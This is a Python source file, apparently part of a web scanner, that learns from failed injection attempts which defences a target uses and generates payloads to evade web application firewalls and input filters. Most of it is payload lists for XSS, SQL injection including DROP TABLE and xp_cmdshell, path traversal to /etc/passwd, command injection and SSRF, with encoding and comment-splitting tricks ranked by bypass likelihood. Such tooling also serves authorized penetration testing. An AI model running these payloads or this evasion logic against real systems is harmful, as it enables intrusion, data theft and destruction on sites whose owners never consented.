"""
Adaptive Payload Learner

This module provides the core learning engine that analyzes failed payload attempts
and generates new payloads specifically crafted to bypass the defenses (WAFs, input
filters, sanitizers, etc.) that caused the initial payloads to fail.

Design principles:
- Learn from EVERY failure: each failed payload teaches the system about target defenses
- Generate TARGETED adaptations: analyze WHY a payload failed and counter specifically
- Cross-pollinate learning: knowledge about one defense informs all subsequent attempts
- Respect limits: configurable max adaptation rounds and payloads per round
- Backward compatible: existing plugin interfaces continue to work unchanged
"""

import logging
import re
import urllib.parse
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants for obstacle detection
# ---------------------------------------------------------------------------

# Patterns that indicate a WAF blocked the request
WAF_BLOCK_PATTERNS = [
    r'web application firewall',
    r'request blocked',
    r'security violation',
    r'access denied',
    r'forbidden.*firewall',
    r'cloudflare.*ray id',
    r'mod_security',
    r'incapsula',
    r'akamai.*error',
    r'sucuri.*blocked',
    r'barracuda.*blocked',
    r'f5.*big-ip.*blocked',
    r'imperva',
    r'request has been blocked',
    r'your request was rejected',
    r'suspicious activity',
    r'attack detected',
    r'invalid request',
]

# Patterns indicating a keyword was filtered from the response
KEYWORD_FILTERED_PATTERNS = [
    r'not allowed',
    r'invalid (input|characters?|value)',
    r'illegal (input|characters?)',
    r'prohibited',
    r'filtered',
    r'sanitized',
    r'stripped',
    r'removed',
    r'disallowed',
]

# Patterns indicating quotes were escaped
QUOTE_ESCAPE_PATTERNS = [
    r'\\\'',
    r'\\"',
    r'&(?:apos|quot);',
    r'&#(?:39|34);',
]

# Patterns indicating encoding was stripped
ENCODING_STRIPPED_PATTERNS = [
    r'%[0-9a-fA-F]{2}.*stripped',
    r'encoded.*removed',
    r'url.*decoded',
    r'html.*decoded',
]

# Status codes indicating a WAF/block
WAF_STATUS_CODES = {403, 406, 429, 501}

# Status codes suggesting filtering (application-level)
FILTER_STATUS_CODES = {400, 422}


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class PayloadAttempt:
    """Record of a single payload attempt and its outcome."""
    payload: str
    success: bool
    status_code: Optional[int] = None
    response_snippet: Optional[str] = None
    failure_reason: Optional[str] = None
    obstacle_type: Optional[str] = None  # 'waf', 'filter', 'encoding', 'length', 'quote', 'unknown'


@dataclass
class TargetDefenseProfile:
    """In-memory knowledge base about a target's defenses."""
    target_url: str
    waf_detected: bool = False
    waf_type: Optional[str] = None
    filtered_keywords: Set[str] = field(default_factory=set)
    blocked_patterns: Set[str] = field(default_factory=set)
    encoding_stripped: bool = False
    encoding_types_stripped: Set[str] = field(default_factory=set)
    quotes_escaped: bool = False
    length_limited: bool = False
    max_observed_length: int = 0
    attempts: List[PayloadAttempt] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Core learner class
# ---------------------------------------------------------------------------

class AdaptivePayloadLearner:
    """
    Core learning engine for adaptive payload generation.

    Maintains per-target knowledge bases and generates evolved payloads that
    specifically counter the defenses identified from previous failed attempts.

    Usage::

        learner = AdaptivePayloadLearner()

        # After a failed attempt, record it and get adapted payloads
        adapted = learner.record_and_adapt(
            target_url='https://example.com/search',
            vuln_type='xss',
            failed_payload='<script>alert(1)</script>',
            status_code=403,
            response_body='Request blocked by firewall',
            success=False,
        )

        for new_payload in adapted:
            # try new_payload …
    """

    # Default caps to prevent infinite loops
    DEFAULT_MAX_ROUNDS = 3
    DEFAULT_MAX_PAYLOADS_PER_ROUND = 10

    def __init__(
        self,
        max_adaptation_rounds: int = DEFAULT_MAX_ROUNDS,
        max_payloads_per_round: int = DEFAULT_MAX_PAYLOADS_PER_ROUND,
    ):
        self.max_adaptation_rounds = max_adaptation_rounds
        self.max_payloads_per_round = max_payloads_per_round
        # key: target_url  →  value: TargetDefenseProfile
        self._profiles: Dict[str, TargetDefenseProfile] = {}

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def record_attempt(
        self,
        target_url: str,
        payload: str,
        success: bool,
        status_code: Optional[int] = None,
        response_body: Optional[str] = None,
        failure_reason: Optional[str] = None,
    ) -> PayloadAttempt:
        """Record a single payload attempt and update the target's defense profile."""
        profile = self._get_or_create_profile(target_url)

        obstacle_type, obstacle_detail = self._identify_obstacle(
            payload, success, status_code, response_body, failure_reason
        )

        attempt = PayloadAttempt(
            payload=payload,
            success=success,
            status_code=status_code,
            response_snippet=(response_body or '')[:300],
            failure_reason=failure_reason or obstacle_detail,
            obstacle_type=obstacle_type,
        )
        profile.attempts.append(attempt)

        # Update the profile with newly detected defenses
        self._update_profile(profile, attempt, response_body or '')

        return attempt

    def generate_adapted_payloads(
        self,
        target_url: str,
        vuln_type: str,
        base_payload: str,
        round_number: int = 1,
    ) -> List[str]:
        """
        Generate payloads adapted to bypass the defenses detected for *target_url*.

        Args:
            target_url:   The URL being attacked (used to look up the defense profile).
            vuln_type:    Vulnerability type string ('xss', 'sqli', 'lfi', …).
            base_payload: The most recent failed payload to mutate from.
            round_number: Current adaptation round (1-based).  Used to pick strategy.

        Returns:
            List of new payloads ordered by estimated bypass likelihood.
        """
        if round_number > self.max_adaptation_rounds:
            logger.debug("Max adaptation rounds (%d) reached for %s", self.max_adaptation_rounds, target_url)
            return []

        profile = self._get_or_create_profile(target_url)
        candidates: List[Tuple[int, str]] = []  # (score, payload)

        # Strategy selection based on detected defenses
        if profile.waf_detected:
            candidates.extend(self._waf_bypass_payloads(base_payload, vuln_type, profile))

        if profile.filtered_keywords:
            candidates.extend(self._keyword_filter_bypass_payloads(base_payload, vuln_type, profile))

        if profile.quotes_escaped:
            candidates.extend(self._quote_bypass_payloads(base_payload, vuln_type))

        if profile.encoding_stripped:
            candidates.extend(self._encoding_bypass_payloads(base_payload, vuln_type))

        if profile.length_limited and profile.max_observed_length > 0:
            candidates.extend(self._length_constrained_payloads(base_payload, vuln_type, profile.max_observed_length))

        # Always include generic vuln-type specific adaptations as a fallback
        candidates.extend(self._generic_adaptations(base_payload, vuln_type, round_number))

        # Deduplicate, score-sort, and limit
        seen: Set[str] = set()
        result: List[str] = []
        for score, p in sorted(candidates, key=lambda x: x[0], reverse=True):
            if p and p not in seen:
                seen.add(p)
                result.append(p)
                if len(result) >= self.max_payloads_per_round:
                    break

        return result

    def record_and_adapt(
        self,
        target_url: str,
        vuln_type: str,
        failed_payload: str,
        status_code: Optional[int] = None,
        response_body: Optional[str] = None,
        failure_reason: Optional[str] = None,
        round_number: int = 1,
        success: bool = False,
    ) -> List[str]:
        """Convenience method: record a failed attempt then return adapted payloads."""
        self.record_attempt(
            target_url=target_url,
            payload=failed_payload,
            success=success,
            status_code=status_code,
            response_body=response_body,
            failure_reason=failure_reason,
        )
        if success:
            return []
        return self.generate_adapted_payloads(
            target_url=target_url,
            vuln_type=vuln_type,
            base_payload=failed_payload,
            round_number=round_number,
        )

    def get_defense_summary(self, target_url: str) -> Dict[str, Any]:
        """Return a dict summarising known defenses for a target (for logging/reporting)."""
        profile = self._profiles.get(target_url)
        if not profile:
            return {}
        return {
            'waf_detected': profile.waf_detected,
            'waf_type': profile.waf_type,
            'filtered_keywords': list(profile.filtered_keywords),
            'encoding_stripped': profile.encoding_stripped,
            'quotes_escaped': profile.quotes_escaped,
            'length_limited': profile.length_limited,
            'max_observed_length': profile.max_observed_length,
            'total_attempts': len(profile.attempts),
        }

    def reset_target(self, target_url: str) -> None:
        """Clear learned data for a target (e.g., when starting a new scan session)."""
        self._profiles.pop(target_url, None)

    # ------------------------------------------------------------------
    # Internal helpers — profile management
    # ------------------------------------------------------------------

    def _get_or_create_profile(self, target_url: str) -> TargetDefenseProfile:
        if target_url not in self._profiles:
            self._profiles[target_url] = TargetDefenseProfile(target_url=target_url)
        return self._profiles[target_url]

    def _identify_obstacle(
        self,
        payload: str,
        success: bool,
        status_code: Optional[int],
        response_body: Optional[str],
        failure_reason: Optional[str],
    ) -> Tuple[str, str]:
        """Identify the type of obstacle that caused a failure."""
        if success:
            return 'none', 'success'

        body = (response_body or '').lower()
        hint = (failure_reason or '').lower()

        # WAF detection
        if status_code in WAF_STATUS_CODES:
            for pat in WAF_BLOCK_PATTERNS:
                if re.search(pat, body, re.IGNORECASE):
                    return 'waf', f'WAF blocked (status {status_code})'
            if status_code == 403:
                return 'waf', f'HTTP 403 Forbidden'

        # Quote escaping
        if any(re.search(p, body) for p in QUOTE_ESCAPE_PATTERNS):
            return 'quote', 'Quotes escaped in response'
        if 'quote' in hint or 'escape' in hint:
            return 'quote', 'Quotes escaped (from hint)'

        # Keyword filtering
        for pat in KEYWORD_FILTERED_PATTERNS:
            if re.search(pat, body, re.IGNORECASE):
                return 'filter', f'Keyword filtered: {pat}'

        # Encoding stripped
        for pat in ENCODING_STRIPPED_PATTERNS:
            if re.search(pat, body, re.IGNORECASE):
                return 'encoding', 'Encoding stripped'
        if 'strip' in hint or 'encod' in hint:
            return 'encoding', 'Encoding stripped (from hint)'

        # Length check (if payload was long and 400 returned)
        if status_code in FILTER_STATUS_CODES:
            return 'filter', f'Request rejected (status {status_code})'

        if 'length' in hint or 'too long' in hint:
            return 'length', 'Payload too long'

        return 'unknown', 'Unknown failure'

    def _update_profile(
        self,
        profile: TargetDefenseProfile,
        attempt: PayloadAttempt,
        response_body: str,
    ) -> None:
        """Update the target defense profile based on a new attempt."""
        body_lower = response_body.lower()

        # WAF detection
        if attempt.obstacle_type == 'waf' or attempt.status_code in WAF_STATUS_CODES:
            profile.waf_detected = True
            # Try to identify WAF vendor
            for vendor in ('cloudflare', 'mod_security', 'incapsula', 'sucuri',
                           'barracuda', 'akamai', 'imperva', 'f5'):
                if vendor in body_lower:
                    profile.waf_type = vendor
                    break

        # Track blocked payload patterns
        if not attempt.success:
            profile.blocked_patterns.add(attempt.payload[:50])

        # Quote escaping
        if attempt.obstacle_type == 'quote':
            profile.quotes_escaped = True

        # Encoding stripped
        if attempt.obstacle_type == 'encoding':
            profile.encoding_stripped = True
            if '%25' in attempt.payload:
                profile.encoding_types_stripped.add('double_url')
            elif '%' in attempt.payload:
                profile.encoding_types_stripped.add('url')

        # Try to detect filtered keywords by comparing payload to response
        for keyword in ('<script', 'onerror', 'onload', 'javascript:', 'union',
                        'select', 'insert', 'drop', 'exec', '../', '..\\',
                        '/etc/', 'cmd', 'system(', 'passthru', 'eval('):
            if keyword in attempt.payload.lower() and keyword not in body_lower:
                profile.filtered_keywords.add(keyword)

    # ------------------------------------------------------------------
    # Payload generation strategies
    # ------------------------------------------------------------------

    def _waf_bypass_payloads(
        self,
        base_payload: str,
        vuln_type: str,
        profile: TargetDefenseProfile,
    ) -> List[Tuple[int, str]]:
        """Generate payloads that commonly bypass WAFs."""
        results: List[Tuple[int, str]] = []

        if vuln_type == 'xss':
            results += [
                (9, '<img src=x onerror=alert`1`>'),
                (9, '<svg/onload=alert(1)>'),
                (8, '<details open ontoggle=alert(1)>'),
                (8, '<input autofocus onfocus=alert(1)>'),
                (8, '<video><source onerror=alert(1)>'),
                (7, '<body onpageshow=alert(1)>'),
                (7, '"><img src=x onerror=alert(1)>'),
                (6, '<ScRiPt>alert(1)</ScRiPt>'),
                (6, '<script\x0etype="text/javascript">alert(1)</script>'),
                (5, '%3Cscript%3Ealert(1)%3C%2Fscript%3E'),
            ]

        elif vuln_type == 'sqli':
            results += [
                (9, "' OR '1'='1"),
                (9, "1' OR '1'='1'--"),
                (8, "1'/**/OR/**/'1'='1"),
                (8, "1' OR 1=1--+"),
                (7, "1%27%20OR%20%271%27=%271"),
                (7, "1' OR 1=1#"),
                (6, "' UNION%09SELECT%09NULL--"),
                (6, "1; SELECT * FROM users--"),
            ]

        elif vuln_type == 'lfi':
            results += [
                (9, '....//....//....//etc/passwd'),
                (8, '..%2F..%2F..%2Fetc%2Fpasswd'),
                (8, '%252e%252e%252f%252e%252e%252fetc%252fpasswd'),
                (7, '..%252f..%252f..%252fetc%252fpasswd'),
                (7, '/./././././././././etc/passwd'),
                (6, '....\\\\....\\\\....\\\\etc\\\\passwd'),
            ]

        elif vuln_type == 'rce':
            results += [
                (9, '; ls'),
                (9, '| id'),
                (8, '`id`'),
                (8, '$(id)'),
                (7, '%0aid'),
                (7, ';id%0a'),
                (6, '|id%0a'),
                (6, '&id'),
            ]

        elif vuln_type in ('ssrf', 'rfi'):
            results += [
                (9, 'http://127.0.0.1/'),
                (8, 'http://localhost/'),
                (8, 'http://0x7f000001/'),
                (7, 'http://0177.0.0.1/'),
                (7, 'http://[::1]/'),
                (6, 'http://2130706433/'),
            ]

        # Generic chunk-encoding / method-switch hints stored as metadata
        results.append((3, base_payload + '<!---->'))
        return results

    def _keyword_filter_bypass_payloads(
        self,
        base_payload: str,
        vuln_type: str,
        profile: TargetDefenseProfile,
    ) -> List[Tuple[int, str]]:
        """Generate payloads avoiding the filtered keywords detected so far."""
        results: List[Tuple[int, str]] = []
        filtered = profile.filtered_keywords

        if vuln_type == 'xss':
            if any(k in filtered for k in ('<script', 'script')):
                # Tag-free XSS alternatives
                results += [
                    (9, '<img src=x onerror=alert(1)>'),
                    (9, '<svg onload=alert(1)>'),
                    (8, '<details open ontoggle=alert(1)>'),
                    (8, '<body onload=alert(1)>'),
                    (8, '<iframe src=javascript:alert(1)>'),
                    (7, '" onmouseover="alert(1)"'),
                    (7, "' onfocus='alert(1)' autofocus='"),
                    (6, 'javascript:alert(1)'),
                ]
            if any(k in filtered for k in ('onerror', 'onload', 'onmouseover')):
                # Alternative event handlers
                results += [
                    (8, '<input autofocus onfocus=alert(1)>'),
                    (8, '<video oncanplay=alert(1) src=x>'),
                    (7, '<details ontoggle=alert(1) open>'),
                    (7, '<select onfocus=alert(1) autofocus>'),
                    (6, '<textarea onfocus=alert(1) autofocus>'),
                ]
            if 'javascript:' in filtered:
                results += [
                    (8, '<img src=x onerror=alert(1)>'),
                    (7, 'data:text/html,<script>alert(1)</script>'),
                ]

        elif vuln_type == 'sqli':
            if any(k in filtered for k in ('union', 'select')):
                # Comment-split keyword bypass
                p = base_payload
                p = re.sub(r'\bUNION\b', 'UN/**/ION', p, flags=re.IGNORECASE)
                p = re.sub(r'\bSELECT\b', 'SEL/**/ECT', p, flags=re.IGNORECASE)
                results.append((9, p))
                # Hex-encoded alternatives
                results += [
                    (8, "1' UNION ALL SELECT NULL,NULL--"),
                    (7, "1'/*!UNION*//*!SELECT*/NULL--"),
                    (7, "1' /*!50000UNION*//*!50000SELECT*/ NULL--"),
                ]
            if any(k in filtered for k in ('drop', 'insert', 'exec')):
                results += [
                    (7, "'; DR/**/OP TABLE users--"),
                    (6, "'; EX/**/EC(xp_cmdshell 'id')--"),
                ]

        elif vuln_type == 'lfi':
            if '../' in filtered or '..' in filtered:
                results += [
                    (9, '....//....//....//etc/passwd'),
                    (8, '%252e%252e/%252e%252e/%252e%252e/etc/passwd'),
                    (8, '..%c0%af..%c0%af..%c0%afetc/passwd'),
                    (7, '..%00/..%00/..%00/etc/passwd'),
                    (7, '/var/www/../../etc/passwd'),
                ]

        elif vuln_type == 'rce':
            if any(k in filtered for k in ('system(', 'exec', 'passthru', 'shell_exec')):
                results += [
                    (9, '`id`'),
                    (9, '$(cat /etc/passwd)'),
                    (8, '; cat /etc/passwd'),
                    (7, '%0acat%20/etc/passwd'),
                ]

        return results

    def _quote_bypass_payloads(
        self,
        base_payload: str,
        vuln_type: str,
    ) -> List[Tuple[int, str]]:
        """Generate payloads that don't rely on quotes, for targets that escape them."""
        results: List[Tuple[int, str]] = []

        if vuln_type == 'xss':
            results += [
                (9, '<img src=x onerror=alert`1`>'),
                (9, '<svg onload=alert`1`>'),
                (8, '<script>alert`1`</script>'),
                (8, '<script>alert(String.fromCharCode(49))</script>'),
                (7, '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'),
                (7, '<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'),
            ]

        elif vuln_type == 'sqli':
            # No-quote SQLi using comment tricks
            results += [
                (9, '1 OR 1=1--'),
                (9, '1 OR 1=1#'),
                (8, '1 UNION SELECT NULL,NULL--'),
                (8, '1;SELECT 1--'),
                (7, '1 OR 0x31=0x31--'),
                (7, '1 OR char(49)=char(49)--'),
            ]

        elif vuln_type == 'lfi':
            p = base_payload.replace("'", '').replace('"', '')
            results.append((8, p))

        return results

    def _encoding_bypass_payloads(
        self,
        base_payload: str,
        vuln_type: str,
    ) -> List[Tuple[int, str]]:
        """Generate payloads that use alternative encoding schemes."""
        results: List[Tuple[int, str]] = []

        # Double URL encode
        try:
            double_enc = urllib.parse.quote(urllib.parse.quote(base_payload, safe=''), safe='')
            results.append((8, double_enc))
        except Exception:
            pass

        # Mixed encoding
        try:
            mixed = ''.join(
                f'%{ord(c):02X}' if c in '<>"\'&;' else c
                for c in base_payload
            )
            if mixed != base_payload:
                results.append((7, mixed))
        except Exception:
            pass

        # HTML entity encoding for XSS
        if vuln_type == 'xss':
            results += [
                (9, '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'),
                (8, '&#60;script&#62;alert(1)&#60;/script&#62;'),
                (7, '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e'),
                (7, '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'),
            ]

        elif vuln_type == 'sqli':
            results += [
                (8, urllib.parse.quote("' OR '1'='1", safe='')),
                # Hex-encoded equivalent of: ' OR '1'='1
                (7, '0x2720OR20273127203D20273127'),
            ]

        elif vuln_type == 'lfi':
            results += [
                (9, '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'),
                (8, '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'),
            ]

        return results

    def _length_constrained_payloads(
        self,
        base_payload: str,
        vuln_type: str,
        max_length: int,
    ) -> List[Tuple[int, str]]:
        """Generate shorter versions of payloads that fit within a length constraint."""
        results: List[Tuple[int, str]] = []

        short_payloads: Dict[str, List[str]] = {
            'xss': [
                '<svg/onload=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)',
                '<script>alert(1)',
                "';alert(1)//",
            ],
            'sqli': [
                "' OR 1=1--",
                "1' OR 1=1#",
                "' OR 'x'='x",
                "1 OR 1=1",
                "admin'--",
            ],
            'lfi': [
                '../etc/passwd',
                '../../etc/passwd',
                '../../../etc/passwd',
                '/etc/passwd',
            ],
            'rce': [
                ';id',
                '|id',
                '`id`',
                '$(id)',
            ],
            'crlf': [
                '%0d%0aX-Injected: 1',
                '\r\nX-Injected: 1',
            ],
        }

        for p in short_payloads.get(vuln_type, []):
            if len(p) <= max_length:
                results.append((8, p))

        # Also try shortening the base payload
        if len(base_payload) > max_length:
            truncated = base_payload[:max_length]
            results.append((5, truncated))

        return results

    def _generic_adaptations(
        self,
        base_payload: str,
        vuln_type: str,
        round_number: int,
    ) -> List[Tuple[int, str]]:
        """Fallback adaptations when no specific defense is detected."""
        results: List[Tuple[int, str]] = []
        score_base = max(1, 5 - round_number)  # Decreasing score for later rounds

        # Case variation
        results.append((score_base, base_payload.upper()))
        results.append((score_base, base_payload.lower()))

        # Null-byte injection (for older systems)
        results.append((score_base - 1, base_payload + '%00'))

        # Comment injection
        p_comment = base_payload.replace(' ', '/**/')
        if p_comment != base_payload:
            results.append((score_base, p_comment))

        # Tab substitution
        p_tab = base_payload.replace(' ', '\t')
        if p_tab != base_payload:
            results.append((score_base - 1, p_tab))

        # Vuln-type specific generic payloads by round
        round_payloads: Dict[str, List[List[str]]] = {
            'xss': [
                # Round 1
                ['<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
                 '<details open ontoggle=alert(1)>'],
                # Round 2
                ['<input autofocus onfocus=alert(1)>', '<video oncanplay=alert(1)>',
                 '" onmouseover="alert(1)"'],
                # Round 3
                ['<script>eval(atob("YWxlcnQoMSk="))</script>',
                 'javascript:alert(1)',
                 '<math href="javascript:alert(1)">click</math>'],
            ],
            'sqli': [
                ["' OR '1'='1", "' OR 1=1--", "1 UNION SELECT NULL--"],
                ["1'/**/OR/**/'1'='1", "1' /*!UNION*/ /*!SELECT*/ NULL--"],
                ["1%27%20OR%201%3D1--", "0x27204f52203127"],
            ],
            'lfi': [
                ['../etc/passwd', '../../etc/passwd', '../../../etc/passwd'],
                ['%2e%2e/etc/passwd', '%252e%252e/etc/passwd'],
                ['....//etc/passwd', '..%2f..%2fetc/passwd'],
            ],
            'rce': [
                ['; id', '| id', '`id`', '$(id)'],
                ['%0aid', ';id%0a', '|id%0a'],
                ['%0a%0aid', '||id', '&&id'],
            ],
        }

        type_rounds = round_payloads.get(vuln_type, [])
        round_idx = min(round_number - 1, len(type_rounds) - 1)
        if round_idx >= 0:
            for p in type_rounds[round_idx]:
                results.append((score_base + 1, p))

        return results
